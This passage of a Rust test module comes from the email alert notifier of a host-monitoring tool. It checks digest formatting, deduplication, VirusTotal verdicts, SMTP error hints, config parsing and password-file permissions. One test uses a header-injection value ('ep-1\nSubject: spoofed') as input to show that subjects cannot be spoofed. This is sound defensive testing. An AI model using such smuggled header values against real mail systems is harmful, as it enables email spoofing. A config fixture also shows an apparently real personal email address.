    fn sanitize_is_utf8_safe_at_the_boundary() {
        // Truncating by bytes would split a multi-byte char and panic.
        let s = "é".repeat(300);
        let clean = sanitize(&s, 10);
        assert!(clean.starts_with(&"é".repeat(10)));
        assert!(clean.contains("290 more characters"), "{clean}");
    }

    #[test]
    fn subject_never_contains_alert_text() {
        // The one rule that makes header injection structurally
        // impossible: the subject is built from manifest host names and
        // counts, never from anything the monitored host said.
        let hosts = vec![HostAlerts {
            host: "otter1".into(),
            alerts: vec![alert("ep-1\nSubject: spoofed", 0.99, true)],
        }];
        let s = subject(&hosts, &VerdictMap::new());
        assert!(!s.contains('\n'));
        assert!(!s.contains("spoofed"), "{s}");
        assert!(s.contains("otter1"));
        assert!(s.contains("1 alert"));
        assert!(s.contains("[1 confirmed]"), "{s}");
    }

    #[test]
    fn subject_summarises_many_hosts() {
        let hosts: Vec<HostAlerts> = ["a", "b", "c", "d"]
            .iter()
            .map(|h| HostAlerts {
                host: (*h).to_string(),
                alerts: vec![alert("ep", 0.95, false)],
            })
            .collect();
        let s = subject(&hosts, &VerdictMap::new());
        assert!(s.contains("4 alerts"), "{s}");
        assert!(s.contains("+2"), "{s}");
    }

    #[test]
    fn body_lists_detail_and_flags_it_as_untrusted() {
        let hosts = vec![HostAlerts {
            host: "otter1".into(),
            alerts: vec![alert("ep-1", 0.99, true)],
        }];
        let b = body(&hosts, &VerdictMap::new());
        assert!(
            b.contains("/tmp/payload"),
            "operator needs the path to triage"
        );
        assert!(b.contains("CONFIRMED by 3/3"));
        // The reader must be told the content is not authenticated.
        assert!(b.contains("attacker-influenceable"), "{b}");
        assert!(b.contains("bowery alerts tail"), "and how to verify");
    }

    #[test]
    fn body_truncates_a_flood_rather_than_growing_without_bound() {
        let alerts: Vec<Alert> = (0..500)
            .map(|i| alert(&format!("ep-{i}"), 0.99, false))
            .collect();
        let hosts = vec![HostAlerts {
            host: "noisy".into(),
            alerts,
        }];
        let b = body(&hosts, &VerdictMap::new());
        assert!(b.contains("and 475 more"), "{}", &b[b.len() - 400..]);
        assert!(
            b.len() < 100_000,
            "digest stayed bounded: {} bytes",
            b.len()
        );
    }

    #[test]
    fn supersedes_collapse_to_the_newest_alert_for_an_episode() {
        // Observed live: a dry run against the real fleet reported every
        // episode twice — the pre-filter alert and its LLM-refined
        // supersession — because only the console was deduping.
        let mut first = alert("ep-1", 1.0, false);
        first.ts_unix_ms = 100;
        first.rationale = "pre-filter score above threshold".into();
        let mut refined = alert("ep-1", 0.89, false);
        refined.ts_unix_ms = 200;
        refined.rationale = "mock backend echoing pre-filter".into();

        let out = dedup_by_episode(vec![first, refined]);
        assert_eq!(out.len(), 1, "one episode is one finding");
        assert_eq!(out[0].rationale, "mock backend echoing pre-filter");
        assert_eq!(out[0].ts_unix_ms, 200, "the newest wins, not the loudest");
    }

    #[test]
    fn dedup_orders_by_suspicion_and_keeps_unkeyed_alerts() {
        let mut low = alert("ep-low", 0.5, false);
        low.ts_unix_ms = 1;
        let mut high = alert("ep-high", 0.99, false);
        high.ts_unix_ms = 2;
        let mut anon = alert("", 0.7, false);
        anon.ts_unix_ms = 3;
        let mut anon2 = alert("", 0.7, false);
        anon2.ts_unix_ms = 4;

        let out = dedup_by_episode(vec![low, high, anon, anon2]);
        assert_eq!(out.len(), 4, "an empty episode_id is not an identity");
        assert!(
            (out[0].suspicion - 0.99).abs() < f32::EPSILON,
            "worst first, so a phone screen shows it"
        );
    }

    #[test]
    fn a_flagged_hash_is_shown_per_alert_and_leads_the_subject() {
        // The digest previously reported only a total ("2 hash(es)
        // checked"), which told an operator nothing about any specific
        // finding — and a VirusTotal hit had no more prominence than a
        // clean one.
        let a = alert("ep-1", 0.95, false);
        let sha = a.exe_sha256_hex.to_ascii_lowercase();
        let hosts = vec![HostAlerts {
            host: "web-1".into(),
            alerts: vec![a],
        }];
        let mut vt = VerdictMap::new();
        vt.insert(
            sha,
            Verdict::Malicious {
                malicious: 41,
                total: 62,
            },
        );

        let b = body(&hosts, &vt);
        assert!(b.contains("41/62"), "the verdict belongs on the alert: {b}");
        let s = subject(&hosts, &vt);
        assert!(s.contains("VT-FLAGGED"), "{s}");
    }

    #[test]
    fn an_unknown_hash_is_counted_so_the_total_is_not_misread() {
        // "2 checked" with nothing else reads as "checked and fine",
        // when it may mean VT has never seen either hash.
        let outcome = VtOutcome {
            looked_up: 2,
            unknown: 2,
            ..VtOutcome::default()
        };
        let line = outcome.line().unwrap();
        assert!(line.contains("2 unknown to VT"), "{line}");
    }

    #[test]
    fn filter_respects_suspicion_and_confirmation() {
        let strict = FilterConfig {
            min_suspicion: 0.9,
            confirmed_only: true,
        };
        assert!(passes(&alert("a", 0.95, true), &strict));
        assert!(!passes(&alert("b", 0.95, false), &strict), "unconfirmed");
        assert!(!passes(&alert("c", 0.5, true), &strict), "below threshold");

        let loose = FilterConfig {
            min_suspicion: 0.9,
            confirmed_only: false,
        };
        assert!(passes(&alert("d", 0.95, false), &loose));
    }

    #[test]
    fn the_gmail_first_run_failure_explains_itself() {
        // Verbatim from a real first run against smtp.gmail.com. The
        // server's wording says nothing about where to get an app
        // password, or that it requires 2FA to exist at all.
        let real = "permanent error (534): 5.7.9 Application-specific password required. \
                    For more information, go to \
                    https://support.google.com/mail/?p=InvalidSecondFactor - gsmtp";
        let hint = auth_hint(real).expect("THE first-run failure must explain itself");
        assert!(hint.contains("apppasswords"), "points at where to get one");
        assert!(hint.contains("2-Step"), "and what it requires first");
        assert!(
            hint.contains("WITHOUT the spaces"),
            "and the formatting trap"
        );
    }

    #[test]
    fn generic_auth_and_tls_failures_are_recognised() {
        assert!(auth_hint("535 5.7.8 Username and Password not accepted").is_some());
        assert!(auth_hint("Must issue a STARTTLS command first").is_some());
        assert!(auth_hint("tls handshake: wrong version number").is_some());
        // Not every failure has advice; inventing some is worse than the
        // server's own text.
        assert!(auth_hint("452 4.2.2 mailbox full").is_none());
    }

    #[test]
    fn cursors_round_trip_and_default_to_zero() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("cursors.json");
        let mut c = Cursors::load(&path).unwrap();
        assert_eq!(c.since("deadbeef"), 0, "unknown agent starts at zero");
        c.by_fp.insert("deadbeef".into(), 42);
        c.save(&path).unwrap();
        let reloaded = Cursors::load(&path).unwrap();
        assert_eq!(reloaded.since("deadbeef"), 42);
    }

    #[test]
    fn a_corrupt_cursor_file_does_not_replay_forever_or_crash() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("cursors.json");
        fs::write(&path, "{ not json").unwrap();
        // Degrades to "start from zero" rather than failing the run —
        // a re-send is recoverable, a notifier that refuses to start is
        // silence.
        assert_eq!(Cursors::load(&path).unwrap().since("x"), 0);
    }

    #[test]
    fn config_parses_the_documented_gmail_block() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("notify.toml");
        fs::write(
            &path,
            r#"
[email]
to            = ["julien.vehent@gmail.com"]
from          = "julien.vehent@gmail.com"
smtp_host     = "smtp.gmail.com"
smtp_port     = 587
username      = "julien.vehent@gmail.com"
password_file = "~/.bowery/smtp-password"
starttls      = true

[filter]
min_suspicion  = 0.9
confirmed_only = false
"#,
        )
        .unwrap();
        let cfg = NotifyConfig::load(&path).expect("documented config must parse");
        assert_eq!(cfg.email.smtp_host, "smtp.gmail.com");
        assert_eq!(cfg.email.smtp_port, 587);
        assert!(cfg.email.starttls);
        assert!((cfg.filter.min_suspicion - 0.9).abs() < f32::EPSILON);
    }

    #[test]
    fn config_without_recipients_is_rejected() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("notify.toml");
        fs::write(
            &path,
            r#"
[email]
to = []
from = "a@b.c"
smtp_host = "smtp.example.com"
username = "a@b.c"
password_file = "/dev/null"
"#,
        )
        .unwrap();
        // A notifier that sends to nobody is the failure mode this whole
        // feature exists to prevent.
        assert!(NotifyConfig::load(&path).is_err());
    }

    #[cfg(unix)]
    #[test]
    fn a_world_readable_password_file_is_refused() {
        use std::os::unix::fs::PermissionsExt as _;
        let dir = tempfile::tempdir().unwrap();
        let pw = dir.path().join("smtp-password");
        fs::write(&pw, "hunter2").unwrap();
        fs::set_permissions(&pw, fs::Permissions::from_mode(0o644)).unwrap();

        let cfg = NotifyConfig {
            email: EmailConfig {
                to: vec!["a@b.c".into()],
                from: "a@b.c".into(),
                smtp_host: "smtp.example.com".into(),
                smtp_port: 587,
                username: "a@b.c".into(),
                password_file: pw.clone(),
                starttls: true,
            },
            filter: FilterConfig::default(),
            virustotal: VtConfig::default(),
        };
        let err = cfg.password().unwrap_err().to_string();
        assert!(err.contains("group/world accessible"), "{err}");

        fs::set_permissions(&pw, fs::Permissions::from_mode(0o600)).unwrap();
        assert_eq!(cfg.password().unwrap(), "hunter2");
    }
}
